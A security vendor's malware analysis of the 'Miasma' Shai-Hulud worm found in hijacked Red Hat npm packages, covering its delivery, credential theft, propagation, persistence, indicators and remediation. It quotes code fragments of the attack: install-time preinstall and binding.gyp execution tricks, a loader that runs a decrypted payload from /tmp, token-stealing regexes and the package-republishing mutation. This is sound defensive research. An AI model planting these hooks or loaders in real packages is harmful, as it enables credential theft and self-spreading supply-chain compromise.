---
excerpt: "JFrog Security Research analyzed 31 hijacked `@redhat-cloud-services` npm package versions carrying a new Shai-Hulud variant. The campaign, identified in the payload as \"Miasma: The Spreading Blight\", uses install-time execution, layered JavaScript obfuscation, Bun-based payload delivery, credential theft, GitHub and npm propagation, and destructive persistence."
title: "Shai-Hulud - Miasma: The Spreading Blight Hits Red Hat npm Packages"
date: "June 1, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/shai-hulud-miasma/image1.png
type: realTimePost
minutes: '10'
---

![](/img/RealTimePostImage/post/shai-hulud-miasma/image1.png)

**Update - Jun 4th 2026:** We identified an alternative, highly evasive install-time execution path used by this malware family that exploits `binding.gyp` files to run code silently during package configuration. See the [Evasive execution via binding.gyp](#evasive-execution-via-bindinggyp) section below for technical details.

JFrog Security Research analyzed **a new Shai-Hulud variant** affecting 96 hijacked @redhat-cloud-services npm package **versions**. The analyzed sample was @redhat-cloud-services/types version 3.6.1, but the same hijacking wave affected a broad set of Red Hat Cloud Services frontend and client packages.

This is not a typosquatting campaign. The packages belong to a legitimate namespace and were abused as trusted delivery vehicles. The malicious versions execute during installation through an npm lifecycle hook, before application code imports anything from the package. The payload identifies this wave through a GitHub dead-drop repository description: **Miasma: The Spreading Blight.**

We will focus on what changed in the **Shai-Hulud \- Miasma** wave. Much of the final payload overlaps with the Shai-Hulud payload family we described in our previous analyses, [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/) and [Shai-Hulud Returns: npm Worm hits @antv in latest ongoing campaign](https://research.jfrog.com/post/shai-hulud-here-we-go-again-may19/): broad credential collection, encrypted exfiltration, GitHub dead-drop fallback, npm abuse, GitHub Actions workflow manipulation, AI-tool persistence, and a destructive token monitor. The important differences are the delivery chain, staging format, exfiltration disguise, and campaign marker.

## Hijacked Red Hat Packages

The affected packages are all under @redhat-cloud-services, a namespace commonly used by Red Hat Cloud Services frontend components, clients, and tooling. The analyzed sample presents itself as a type package, with main and types pointing to TypeScript declarations, but its package metadata includes a hidden install-time execution path:

```json
{
  "name": "@redhat-cloud-services/types",
  "version": "3.6.1",
  "scripts": {
    "preinstall": "node index.js"
  }
}
```

This is a strong signal by itself. A type-only package does not normally need to run a JavaScript installer before installation completes. In this case, the preinstall hook launches a heavily obfuscated loader that unwraps the Shai-Hulud payload.

The hijacked package versions are listed in the IOC section. The campaign includes @redhat-cloud-services/chrome, @redhat-cloud-services/frontend-components, multiple generated API clients, MCP packages, shared utilities, and @redhat-cloud-services/types.

### Evasive execution via binding.gyp

While the hijacked Red Hat packages used explicit scripts in `package.json`, some variants in this malware family use a quieter trick: `binding.gyp` command expansion.

If a package has a `binding.gyp` file at its root and no custom `preinstall` or `install` scripts in `package.json`, npm falls back to running `node-gyp rebuild`. During the configuration step, `node-gyp` parses the file and executes any command expansion inside `<!(...)` syntax directly in the host shell.

Attackers can abuse this fallback step by hiding their loader inside a fake native compilation configuration:

```json
{
  "targets": [
    {
      "target_name": "Setup",
      "type": "none",
      "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]
    }
  ]
}
```

This executes the obfuscated installer (`node index.js`) silently during package configuration, before standard script checkers inspect `package.json` hooks. It's a handy way to dodge scanners looking for plain lifecycle scripts.

## Install-Time Loader And Staging

The delivery chain starts with a single large JavaScript file invoked by node during preinstall. Its first layer reconstructs JavaScript from a large numeric character array, applies a ROT-style transform, and evaluates the result. This hides the next stage from simple static scanners while keeping the package valid enough for npm installation.

![](/img/RealTimePostImage/post/shai-hulud-miasma/image2.png)

After this wrapper is removed, the next stage decrypts two AES-128-GCM blobs. One blob is a **small Bun bootstrapper** under /tmp/b\*.js and the other is the main Shai-Hulud payload. The loader writes the main payload to a transient file under /tmp/p\*.js, runs it with Bun, and deletes the file afterward.

```javascript
const bunBootstrap = decrypt(...);
const mainPayload = decrypt(...);

const payloadPath = `/tmp/p${Math.random().toString(36).slice(2)}.js`;
fs.writeFileSync(payloadPath, mainPayload);

if (typeof Bun !== "undefined") {
  execSync(`bun run "${payloadPath}"`, { stdio: "inherit" });
} else {
  await eval(bunBootstrap);
  execSync(`"${getBunPath()}" run "${payloadPath}"`, { stdio: "inherit" });
}

fs.unlinkSync(payloadPath);
```

The bootstrapper downloads Bun from GitHub releases if the runtime is missing, using bun-v1.3.13 builds for Linux, macOS, and Windows. This makes the payload less dependent on the victim having Bun installed beforehand. It also changes the telemetry defenders should expect: an npm install can lead to node, then curl and unzip, and then bun run executing a temporary file.

## Why This Is Shai-Hulud \- Miasma

The final payload is a Shai-Hulud variant. Its core behavior matches the family we previously analyzed: it steals local and cloud credentials, searches for GitHub and npm tokens, abuses GitHub Actions identities, propagates through npm packages and GitHub repositories, and installs persistence on developer machines.

Rather than repeat the full collector analysis, the meaningful differences in this wave are:

| Area | Previous Shai-Hulud wave | Miasma wave |
| :---- | :---- | :---- |
| npm execution | Bun payload embedded in package.json                         | Bun payload embedded inside obfuscated index.js |
| Staging | Large obfuscated Bun bundle embedded directly | Numeric-array wrapper, ROT transform, AES-128-GCM staging, transient /tmp/p\*.js execution |
| Direct exfiltration | Endpoint disguised as telemetry traffic under t\[.\]m-kosche\[.\]com | Legitimate Anthropic API host with a non-standard /v1/api path used as camouflage |
| GitHub dead-drop marker | Campaign strings such as Shai-Hulud: Here We Go Again | Public repositories described as Miasma: The Spreading Blight |
| Payload family behavior | Credential theft, GitHub dead-drop exfiltration, npm/GitHub propagation, AI-tool hooks, token monitor | Same final payload family with updated delivery and campaign marker |

The name Miasma: The Spreading Blight is not an external label added by researchers. It appears in the payload logic as the description for attacker-created public GitHub repositories used for exfiltration. That makes it a useful campaign marker for hunting and for distinguishing this wave from earlier Shai-Hulud activity.

## Credential Theft And Secret Collection

Once running, the payload performs the same broad collection expected from modern Shai-Hulud variants. It collects shell environment variables, host identity, username, local credential files, and GitHub CLI tokens through gh auth token. It searches for GitHub personal access tokens, GitHub fine-grained tokens, GitHub Actions tokens, npm tokens, cloud credentials, private keys, Docker credentials, shell histories, .env files, and other developer secrets.

The payload includes provider-specific collectors for AWS, Azure, GCP, Kubernetes, Vault, and password managers. In cloud environments, this means the malware is not limited to static files on disk. It can query metadata services, enumerate secrets from services such as AWS Secrets Manager and SSM Parameter Store, retrieve Azure Key Vault secrets, read GCP Secret Manager values, and enumerate Kubernetes secrets when the current identity has permission.

The GitHub Actions behavior is especially important. As in the previous Shai-Hulud wave, the payload can target CI runners and attempt to recover secrets from the runner environment and process memory. This can bypass log masking because the secret is read from the runtime context rather than printed in workflow logs.

Representative token patterns searched by the payload include:

```javascript
{
  githubClassic: /gh[op]_[A-Za-z0-9]{36}/g,
  githubFineGrained: /github_pat_[A-Za-z0-9_]{22,}/g,
  npmToken: /npm_[A-Za-z0-9]{36,}/g,
  githubActionsJwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g
}
```

## Exfiltration Disguised As Anthropic Traffic

The direct exfiltration path in this sample is configured to look like traffic to Anthropic:

```
domain: api.anthropic.com
path: v1/api
port: 443
```

The configured destination is hxxps\[:\]//api\[.\]anthropic\[.\]com/v1/api. This appears to be **a legitimate Anthropic services API host**, not attacker-owned infrastructure. A plain GET request to this URL returns Anthropic's API-style 404 not\_found\_error, indicating that /v1/api is not a normal working API route.

This suggests the attackers used the URL primarily as camouflage: the domain looks legitimate in network logs, while the path is shaped like an API endpoint. The sample does not prove compromise of Anthropic infrastructure.

This makes the indicator operationally different from a typical C2 domain. Blocking the entire host may not be practical in organizations that legitimately use Anthropic services, while allowing it without inspection can create a blind spot. Defenders should therefore hunt for the full path, unusual request shape, unexpected clients during npm installation, and node or bun processes contacting api\[.\]anthropic\[.\]com from developer machines or CI runners.

The payload also retains the GitHub dead-drop model seen in previous Shai-Hulud waves. If it has a usable GitHub token, it can create a public repository under the victim account and commit result files under results/results-\<timestamp\>-\<counter\>.json. Repository names follow an \<adjective\>-\<noun\>-\<number\> pattern, while the repository description is set to:

```
Miasma: The Spreading Blight
```

![](/img/RealTimePostImage/post/shai-hulud-miasma/image3.png)

When the payload includes a stolen token in a commit message, it uses the threat marker:

```
IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner
```

This is another direct connection to the Shai-Hulud family. The wording changed across waves, but the operational meaning is the same: responders should not revoke exposed GitHub tokens before isolating infected hosts and removing persistence.

## Propagation Through npm And GitHub

The npm propagation path activates when the payload finds npm credentials with sufficient publish permissions. It queries npm token metadata, determines writable packages through token scopes and package ownership, downloads package tarballs, injects a wrapped copy of itself, modifies package.json, bumps the patch version, and republishes the result through the npm registry.

The mutation is designed to be small but effective:

```javascript
pkg.scripts ??= {};
pkg.scripts.preinstall = "bun run index.js";
pkg.dependencies ??= {};
pkg.dependencies.bun = "^1.3.13";
pkg.version = `${major}.${minor}.${patch + 1}`;
```

The payload also contains an npm trusted-publishing path. In GitHub Actions environments, it can use ACTIONS\_ID\_TOKEN\_REQUEST\_TOKEN and ACTIONS\_ID\_TOKEN\_REQUEST\_URL to request an OIDC token for npm:registry.npmjs.org, exchange it at the npm registry, and publish through the obtained identity. This is the same core risk we highlighted in the previous Shai-Hulud analysis: provenance can show where a package was built, but it cannot prove that the build environment was clean.

On GitHub, the payload can enumerate repositories writable by the stolen token, modify GitHub Actions, and target JavaScript action repositories. One path converts a JavaScript action into a composite action that installs Bun and runs the injected payload from the action directory. Another path injects workflows intended to expose repository secrets as artifacts.

## Persistence And The Dead-Man Switch

The Miasma sample includes local persistence through both operating-system launch mechanisms and developer tooling. On Linux, it can install a user-level kitty-monitor.service; on macOS, it can install com.user.kitty-monitor.plist. The monitor polls GitHub commit search for signed instructions and can download and execute follow-on Python payloads.

The payload also targets AI and developer tools by scanning for writable settings files related to Claude, Codex, Gemini, Copilot, Kiro, and opencode. It can write a local payload copy under \~/.config/index.js and add session-start hooks that install or invoke Bun and rerun the payload. It can also add VS Code folder-open tasks that execute a setup script when a repository is opened.

The destructive token monitor remains the most dangerous remediation trap. The payload can install gh-token-monitor, store a stolen GitHub token and a handler, and poll hxxps\[:\]//api\[.\]github\[.\]com/user. If the token becomes invalid, the stored handler can run destructive shell commands such as deleting the user's home directory and Documents folder.

For incident response, the order matters: isolate affected machines and runners first, remove persistence, preserve forensic evidence, and only then revoke tokens from a clean system.

## How did JFrog Curation protect against this attack?

JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant (non-malicious) versions.

The full, updated list of relevant packages in this campaign is also available through the JFrog Catalog label \- “Miasma: The Spreading Blight”

![](/img/RealTimePostImage/post/shai-hulud-miasma/image4.png)

## Remediation

- Identify projects, lockfiles, CI logs, package caches, and container images that installed any affected @redhat-cloud-services package version listed in the IOC section.  
- Remove compromised package versions with npm uninstall \<package\> and reinstall verified clean versions. Regenerate lockfiles from trusted metadata.  
- Temporarily use npm ci \--ignore-scripts in CI where lifecycle scripts are not required, and quarantine newly published package versions until reviewed.  
- Isolate affected developer machines and CI/CD runners before revoking GitHub tokens, because token invalidation may trigger destructive persistence.  
- Preserve disk images, npm cache, shell history, process telemetry, CI logs, GitHub audit logs, and package publish history for forensics.  
- Stop and remove kitty-monitor persistence on Linux and macOS, including \~/.config/systemd/user/kitty-monitor.service, \~/.local/share/kitty/cat.py, and \~/Library/LaunchAgents/com.user.kitty-monitor.plist.  
- Stop and remove gh-token-monitor persistence, including \~/.config/gh-token-monitor/, \~/.local/bin/gh-token-monitor.sh, \~/.config/systemd/user/gh-token-monitor.service, and \~/Library/LaunchAgents/com.user.gh-token-monitor.plist.  
- Inspect developer-tool settings for injected hooks or folder-open tasks, especially .claude/settings.json, .claude/setup.mjs, .vscode/tasks.json, and \~/.config/index.js.  
- Review GitHub accounts and organizations for newly created public repositories with the description Miasma: The Spreading Blight, result files under results/, unexpected workflow changes, forced tag updates, and commits with messages such as chore: update dependencies, fix: ci, or IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner.  
- Audit npm accounts and organizations for unexpected patch-version publishes, added preinstall scripts, added Bun dependencies, and root-level payload files.  
- **After persistence removal is verified**, rotate GitHub tokens, npm tokens, GitHub Actions secrets, cloud credentials, Kubernetes service account tokens, Vault tokens, Docker credentials, SSH keys, password-manager credentials, and any secrets exposed to affected machines or runners.  
- Rebuild affected CI runners, containers, and developer workstations from clean images where compromise cannot be ruled out.

## Conclusions

Shai-Hulud \- Miasma is a continuation of the same supply-chain threat model, but with a new delivery shape and campaign marker. The payload does not only steal secrets from local files. It treats developer machines and CI/CD runners as launch points into GitHub, npm, cloud providers, Kubernetes, and downstream package consumers.

The Red Hat namespace hijacking also shows why package reputation alone is not enough. These were legitimate-looking packages in a trusted scope, and the malicious behavior occurred before application code had to import them. Lifecycle scripts, newly published versions, and unexpected runtime dependencies remain critical inspection points.

These malicious packages are detected by JFrog Xray and JFrog Curation.

## IOCs

### Affected npm packages


| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| @redhat-cloud-services/chrome | XRAY-993950 | 2.3.4, 2.3.1, 2.3.2 |
| @redhat-cloud-services/compliance-client | XRAY-993937 | 4.0.3, 4.0.4, 4.0.6 |
| @redhat-cloud-services/config-manager-client | XRAY-993938 | 5.0.4, 5.0.5, 5.0.7 |
| @redhat-cloud-services/entitlements-client | XRAY-993945 | 4.0.11, 4.0.12, 4.0.14 |
| @redhat-cloud-services/eslint-config-redhat-cloud-services | XRAY-993941 | 3.2.2, 3.2.1, 3.2.4 |
| @redhat-cloud-services/frontend-components | XRAY-993928 | 7.7.3, 7.7.2, 7.7.5 |
| @redhat-cloud-services/frontend-components-advisor-components | XRAY-993939 | 3.8.2, 3.8.4, 3.8.6 |
| @redhat-cloud-services/frontend-components-config | XRAY-993946 | 6.11.3, 6.11.4, 6.11.6 |
| @redhat-cloud-services/frontend-components-config-utilities | XRAY-993930 | 4.11.5, 4.11.3, 4.11.2 |
| @redhat-cloud-services/frontend-components-notifications | XRAY-993948 | 6.9.2, 6.9.3, 6.9.5 |
| @redhat-cloud-services/frontend-components-remediations | XRAY-993933 | 4.9.2, 4.9.3, 4.9.5 |
| @redhat-cloud-services/frontend-components-testing | XRAY-993935 | 1.2.1, 1.2.2, 1.2.4 |
| @redhat-cloud-services/frontend-components-translations | XRAY-993944 | 4.4.4, 4.4.2, 4.4.1 |
| @redhat-cloud-services/frontend-components-utilities | XRAY-993949 | 7.4.1, 7.4.2, 7.4.4 |
| @redhat-cloud-services/hcc-feo-mcp | XRAY-993926 | 0.3.1, 0.3.2, 0.3.4 |
| @redhat-cloud-services/hcc-kessel-mcp | XRAY-993925 | 0.3.1, 0.3.2, 0.3.4 |
| @redhat-cloud-services/hcc-pf-mcp | XRAY-993931 | 0.6.1, 0.6.2, 0.6.4 |
| @redhat-cloud-services/host-inventory-client | XRAY-993947 | 5.0.3, 5.0.4, 5.0.6 |
| @redhat-cloud-services/insights-client | XRAY-993943 | 4.0.4, 4.0.5, 4.0.7 |
| @redhat-cloud-services/integrations-client | XRAY-993922 | 6.0.4, 6.0.5, 6.0.7 |
| @redhat-cloud-services/javascript-clients-shared | XRAY-993923 | 2.0.11, 2.0.8, 2.0.9 |
| @redhat-cloud-services/notifications-client | XRAY-993942 | 6.1.4, 6.1.5, 6.1.7 |
| @redhat-cloud-services/patch-client | XRAY-993924 | 4.0.4, 4.0.5, 4.0.7 |
| @redhat-cloud-services/quickstarts-client | XRAY-993934 | 4.0.11, 4.0.12, 4.0.14 |
| @redhat-cloud-services/rbac-client | XRAY-993927 | 9.0.3, 9.0.4, 9.0.6 |
| @redhat-cloud-services/remediations-client | XRAY-993936 | 4.0.4, 4.0.5, 4.0.7 |
| @redhat-cloud-services/rule-components | XRAY-993929 | 4.7.2, 4.7.3, 4.7.5 |
| @redhat-cloud-services/sources-client | XRAY-993920 | 3.0.10, 3.0.11, 3.0.13 |
| @redhat-cloud-services/topological-inventory-client | XRAY-993940 | 3.0.10, 3.0.11, 3.0.13 |
| @redhat-cloud-services/tsc-transform-imports | XRAY-993932 | 1.2.2, 1.2.4, 1.2.6 |
| @redhat-cloud-services/types | XRAY-993921 | 3.6.1, 3.6.2, 3.6.4 |
| @redhat-cloud-services/vulnerabilities-client | XRAY-994062 | 2.1.11, 2.1.8, 2.1.9 |

### Packages using the binding.gyp execution method

| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| `@jagreehal/workflow` | XRAY-995476 | 1.16.1 |
| `@vapi-ai/server-sdk` | XRAY-995473 | 0.11.1, 0.11.2, 1.2.1, 1.2.2 |
| `ai-sdk-ollama` | XRAY-995483 | 0.13.1, 1.1.1, 2.2.1, 3.8.5 |
| `autotel` | XRAY-995465 | 2.26.4, 3.4.3 |
| `autotel-adapters` | XRAY-995501 | 0.3.5 |
| `autotel-audit` | XRAY-995492 | 0.1.15 |
| `autotel-aws` | XRAY-995487 | 0.13.10 |
| `autotel-backends` | XRAY-995471 | 2.12.26 |
| `autotel-cli` | XRAY-995508 | 0.8.14 |
| `autotel-cloudflare` | XRAY-995479 | 2.18.16 |
| `autotel-devtools` | XRAY-995469 | 0.1.1, 1.0.4, 2.1.1, 3.0.2, 4.0.1, 5.1.1, 6.1.2 |
| `autotel-drizzle` | XRAY-995505 | 0.0.27 |
| `autotel-edge` | XRAY-995503 | 3.16.13 |
| `autotel-eventcatalog` | XRAY-995463 | 1.0.1, 2.0.1, 3.0.1, 4.0.2, 5.0.1 |
| `autotel-hono` | XRAY-995499 | 0.4.26 |
| `autotel-mcp` | XRAY-995511 | 0.1.14, 2.0.1, 3.0.1, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.0.1, 10.0.1, 11.0.1, 13.0.1, 14.0.1, 15.0.2, 16.0.1, 17.0.2, 18.0.1, 19.0.1, 20.0.1, 21.1.1, 22.0.1, 23.0.1, 24.0.1, 25.0.1, 26.0.2, 27.0.1, 28.0.3 |
| `autotel-mcp-instrumentation` | XRAY-995458 | 29.0.2, 30.0.5, 31.0.1, 32.0.1, 33.0.2, 34.0.1 |
| `autotel-mongoose` | XRAY-995478 | 0.0.3, 1.0.2, 2.0.5, 3.0.1, 4.0.1, 5.0.2, 6.0.1 |
| `autotel-pact` | XRAY-995462 | 0.2.2, 1.0.3 |
| `autotel-playwright` | XRAY-995486 | 0.4.32 |
| `autotel-plugins` | XRAY-995496 | 0.19.26 |
| `autotel-sentry` | XRAY-995464 | 0.5.13 |
| `autotel-subscribers` | XRAY-995504 | 4.1.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.0.1, 10.0.1, 11.0.1, 12.0.1, 13.0.1, 14.1.1, 15.0.1, 16.0.2, 17.0.1, 18.0.3, 19.0.1, 20.0.1, 21.0.1, 22.0.2, 23.0.2, 24.0.1, 25.0.1, 26.0.1, 27.0.2, 28.0.2, 29.0.6, 30.0.4, 31.1.4 |
| `autotel-tanstack` | XRAY-995470 | 1.13.27 |
| `autotel-terminal` | XRAY-995491 | 2.1.1, 3.0.1, 4.0.2, 5.0.1, 6.0.3, 7.0.1, 8.0.1, 9.0.1, 10.0.2, 11.0.1, 12.0.1, 13.0.1, 14.0.1, 15.0.2, 16.0.2, 17.0.10, 18.0.4, 19.0.8, 20.0.2, 21.0.1, 22.0.2, 23.0.3 |
| `autotel-vitest` | XRAY-995484 | 0.4.26 |
| `autotel-web` | XRAY-995475 | 1.12.2 |
| `awaitly` | XRAY-995494 | 1.33.3 |
| `awaitly-analyze` | XRAY-995510 | 0.24.2, 1.1.1, 2.0.1, 3.0.1, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1 |
| `awaitly-libsql` | XRAY-995485 | 0.1.1, 1.0.1, 2.0.1, 3.0.1, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.0.1, 10.0.1, 11.0.1, 12.0.1, 13.0.1, 14.0.1, 15.0.1, 16.0.1, 17.0.1, 18.1.1, 19.0.1, 20.0.1, 21.0.1, 22.0.1 |
| `awaitly-mongo` | XRAY-995477 | 0.1.1, 1.0.1, 2.0.1, 3.0.1, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.1.1, 10.0.1, 11.0.1, 12.0.1, 13.0.1, 14.0.1, 15.0.1, 16.0.1, 17.0.1, 18.0.1, 19.1.1, 20.0.1, 21.0.1, 22.0.1, 23.0.1 |
| `awaitly-postgres` | XRAY-995481 | 0.1.1, 1.0.1, 2.0.1, 3.0.2, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.0.1, 10.0.1, 11.0.1, 12.0.1, 13.0.1, 14.0.1, 15.0.1, 16.0.1, 17.0.1, 18.0.1, 19.1.1, 20.0.1, 21.0.1, 22.0.1, 23.0.1 |
| `awaitly-visualizer` | XRAY-995495 | 1.0.1, 2.0.2, 3.0.1, 4.0.1, 5.0.1, 6.0.1, 7.0.1, 8.0.1, 9.0.1, 10.0.1, 11.0.1, 12.0.1, 13.0.1, 14.0.1, 15.0.1, 16.0.1, 17.0.1, 18.1.1, 19.0.1, 20.0.2, 21.0.1, 22.0.2 |
| `effect-analyzer` | XRAY-995512 | 0.3.1 |
| `eslint-plugin-awaitly` | XRAY-995498 | 0.17.1, 1.0.1 |
| `eslint-plugin-executable-stories-jest` | XRAY-995502 | 1.2.1, 2.1.8 |
| `eslint-plugin-executable-stories-playwright` | XRAY-995467 | 1.2.1, 2.1.8 |
| `eslint-plugin-executable-stories-vitest` | XRAY-995466 | 1.2.1, 2.1.8 |
| `executable-stories-cypress` | XRAY-995489 | 3.1.1, 4.0.1, 5.0.1, 6.1.1, 7.0.3, 8.3.2 |
| `executable-stories-demo` | XRAY-995482 | 0.1.11 |
| `executable-stories-formatters` | XRAY-995506 | 0.11.2 |
| `executable-stories-init` | XRAY-995461 | 0.1.2 |
| `executable-stories-jest` | XRAY-995488 | 3.1.1, 4.0.1, 5.0.1, 6.1.1, 7.0.3, 8.3.2 |
| `executable-stories-mcp` | XRAY-995459 | 0.3.3 |
| `executable-stories-playwright` | XRAY-995493 | 3.1.1, 4.0.1, 5.0.1, 6.1.1, 7.0.3, 8.4.3 |
| `executable-stories-react` | XRAY-995460 | 0.1.7 |
| `executable-stories-vitest` | XRAY-995468 | 2.0.1, 3.1.1, 4.0.1, 5.0.1, 6.1.1, 7.0.3, 8.3.3 |
| `mountly` | XRAY-995500 | 0.2.2 |
| `mountly-tailwind` | XRAY-995490 | 0.1.3 |
| `node-env-resolver` | XRAY-995509 | 6.5.1 |
| `node-env-resolver-aws` | XRAY-995497 | 9.1.2, 10.0.1, 11.0.1, 12.0.1 |
| `node-env-resolver-dotenvx` | XRAY-995507 | 1.0.1, 2.0.1 |
| `node-env-resolver-nextjs` | XRAY-995472 | 7.4.2 |
| `node-env-resolver-vite` | XRAY-995480 | 2.4.2 |
| `wrangler-deploy` | XRAY-995474 | 1.5.5 |
| `@contaazul/n8n-nodes-contaazul` | XRAY-995801 | 0.3.26 |
| `@forjacms/analytics` | XRAY-995799 | 1.8.4 |
| `@forjacms/client` | XRAY-995794 | 1.8.4 |
| `@forjacms/sections` | XRAY-995792 | 1.8.4 |
| `@forjacms/sections-react` | XRAY-995793 | 1.8.4 |
| `create-cf-token` | XRAY-995797 | 1.1.3, 1.1.2, 1.1.4 |
| `creditcard.js` | XRAY-995795 | 3.0.60, 2.1.8 |
| `dbmux` | XRAY-995796 | 1.0.5, 1.0.6, 2.2.4, 2.2.5 |
| `discord-search` | XRAY-995800 | 0.1.2, 0.1.1, 0.1.3 |
| `github-archiver` | XRAY-995798 | 1.5.5, 1.5.4, 1.5.6 |
| `@ethlete/cdk` | XRAY-995883 | 4.71.2 |
| `@ethlete/cli` | XRAY-995889 | 2.0.1 |
| `@ethlete/components` | XRAY-995888 | 3.3.1 |
| `@ethlete/contentful` | XRAY-995927 | 3.9.1 |
| `@ethlete/core` | XRAY-995887 | 4.31.1 |
| `@ethlete/dsp` | XRAY-995886 | 0.3.1 |
| `@ethlete/query` | XRAY-995884 | 5.43.2 |
| `@ethlete/theming` | XRAY-995882 | 2.7.1 |
| `@ethlete/types` | XRAY-995885 | 1.11.4 |

### PyPI wave packages
These packages include the same payload, except that the repositories created on GitHub contains the description `Hades - The End for the Damned`, each package contains `_index.js` code, added to the original codebase with a `.pth` file for autorun, installs Bun and executes the payload.

| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| `bramin` | XRAY-997585 | 0.0.2, 0.0.4, 0.0.3 |
| `cmd2func` | XRAY-997649 | 0.2.3, 0.2.2 |
| `coolbox` | XRAY-997645 | 0.4.1, 0.4.2 |
| `dynamo-release` | XRAY-997642 | 1.5.4 |
| `executor-engine` | XRAY-997644 | 0.3.5, 0.3.4 |
| `executor-http` | XRAY-997584 | 0.1.4, 0.1.3 |
| `funcdesc` | XRAY-997651 | 0.2.3, 0.2.2 |
| `magique` | XRAY-997648 | 0.6.8, 0.6.9 |
| `magique-ai` | XRAY-997643 | 0.4.5, 0.4.4 |
| `mrbios` | XRAY-997586 | 0.1.1, 0.1.2 |
| `napari-ufish` | XRAY-997647 | 0.0.3, 0.0.2 |
| `nucbox` | XRAY-997142 | 0.1.3, 0.1.2 |
| `okite` | XRAY-997587 | 0.0.7, 0.0.8 |
| `pantheon-agents` | XRAY-997646 | 0.6.1, 0.6.2 |
| `pantheon-toolsets` | XRAY-997143 | 0.5.5, 0.5.6 |
| `spateo-release` | XRAY-997141 | 1.1.2 |
| `synago` | XRAY-997588 | 0.1.2, 0.1.1 |
| `ufish` | XRAY-997650 | 0.1.3, 0.1.2 |
| `uprobe` | XRAY-997140 | 0.1.3, 0.1.4 |

### Network IOCs

- hxxps\[:\]//api\[.\]anthropic\[.\]com/v1/api \- configured destination on a legitimate Anthropic API host; plain GET returns 404 not\_found\_error, suggesting camouflage rather than attacker-owned infrastructure.  
- hxxps\[:\]//api\[.\]github\[.\]com/search/commits?q=firedalazer \- GitHub commit-search C2 used by kitty-monitor.

### File hashes from the analyzed package

- 7069e28a5806db4ab0273639667d203f5e31b401d403af7e36d9f360c1f6d655 \- malicious package metadata for @redhat-cloud-services/types version 3.6.1.  
- b86c5ae9e95bd841a595440faa3eb6317441e746f241ae8fd641ab59ed1d1966 \- obfuscated install-time JavaScript loader in the analyzed package.

### Host and persistence IOCs

- /tmp/p\*.js \- transient Bun payload path.  
- /tmp/b-\*/bun \- downloaded Bun runtime.  
- /tmp/b-\*/bun.exe \- downloaded Bun runtime on Windows.  
- /tmp/b-\*/b.zip \- downloaded Bun archive.  
- /tmp/.bun\_ran \- Bun execution marker.  
- /var/tmp/.gh\_update\_state \- kitty-monitor state file.  
- \~/.local/share/kitty/cat.py \- Python payload used by kitty-monitor.  
- \~/.config/systemd/user/kitty-monitor.service \- Linux user service for kitty-monitor.  
- \~/Library/LaunchAgents/com.user.kitty-monitor.plist \- macOS LaunchAgent for kitty-monitor.  
- \~/.config/gh-token-monitor/token \- stored GitHub token monitored by the dead-man switch.  
- \~/.config/gh-token-monitor/handler \- stored dead-man switch handler.  
- \~/.local/bin/gh-token-monitor.sh \- GitHub token monitor script.  
- \~/.config/systemd/user/gh-token-monitor.service \- Linux user service for gh-token-monitor.  
- \~/Library/LaunchAgents/com.user.gh-token-monitor.plist \- macOS LaunchAgent for gh-token-monitor.  
- \~/.config/index.js \- local payload copy used by developer-tool persistence.  
- .claude/settings.json \- possible AI-tool hook target.  
- .claude/setup.mjs \- possible AI-tool persistence setup file.  
- .vscode/tasks.json \- possible folder-open persistence target.  
- .github/setup.js \- possible repository payload file.  
- \_index.js \- possible workflow payload filename.

### Repository and workflow IOCs

- Miasma: The Spreading Blight \- attacker-created GitHub exfiltration repository description.  
- results/results-\*.json \- exfiltrated result file path in GitHub dead-drop repositories.  
- format-results \- GitHub Actions artifact name used for secret dumping.  
- format-results.txt \- GitHub Actions artifact file used for secret dumping.  
- Run Copilot \- suspicious workflow name.  
- release \- suspicious publishing workflow name when paired with the other IOCs.  
- chore: update dependencies \- propagation commit message.  
- chore: update dependencies \[skip ci\] \- propagation commit message variant.  
- fix: ci \- workflow-related commit message.  
- IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner \- token invalidation threat marker.  
- OIDC\_PACKAGES \- workflow environment variable used by propagation logic.  
- WORKFLOW\_ID \- workflow environment variable used by propagation logic.  
- REPO\_ID\_SUFFIX \- workflow environment variable used by propagation logic.  
- VARIABLE\_STORE \- workflow environment variable used for dumping GitHub Actions secrets.  
- bun run \_index.js \- injected workflow execution command.  
- bun run $GITHUB\_ACTION\_PATH/index.js \- injected GitHub Action execution command.

### Suspicious commands

- node index.js  
- bun run /tmp/p\*.js  
- curl \-sSL hxxps\[:\]//github\[.\]com/oven-sh/bun/releases/download/bun-v1.3.13/  
- unzip \-j \-o b.zip  
- gh auth token  
- ps aux  
- tasklist  
- systemctl \--user enable \--now kitty-monitor.service  
- launchctl bootstrap gui/\<uid\> \~/Library/LaunchAgents/com.user.kitty-monitor.plist  
- python3 \<tempfile\_from\_github\_commit\_monitor\>  
- npm install bun  
- curl \-fsSL hxxps\[:\]//bun\[.\]sh/install | bash

